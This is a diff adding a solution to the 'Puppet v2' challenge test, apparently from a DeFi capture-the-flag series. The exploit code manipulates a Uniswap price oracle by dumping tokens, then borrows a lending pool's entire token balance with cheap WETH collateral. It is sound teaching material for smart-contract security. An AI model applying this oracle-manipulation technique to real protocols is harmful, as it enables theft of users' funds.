@@ -82,6 +82,42 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // 1. Swap all DVT out of uniswap pool => give us ETH
+        // 2. Wrap ETH to get WETH
+        // 3. Use WETH to borrow from lending pool
+
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            1,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        )
+
+        let WETHRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        let WETHBalance = await this.weth.balanceOf(attacker.address);
+        let ETHBalance = await ethers.provider.getBalance(attacker.address);
+        console.log("WETH Required: ", WETHRequired.toString() / (10 ** 18));
+        console.log("ETH Attacker had: ", ETHBalance.toString() / (10 ** 18));
+        
+        await this.weth.connect(attacker).deposit(
+            {value: WETHRequired}
+        );
+        console.log("WETH Attacker had: ", WETHBalance.toString() / (10 ** 18));
+            
+        await this.weth.connect(attacker).approve(
+            this.lendingPool.address, 
+            WETHRequired
+        );
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
     });
 
     after(async function () {
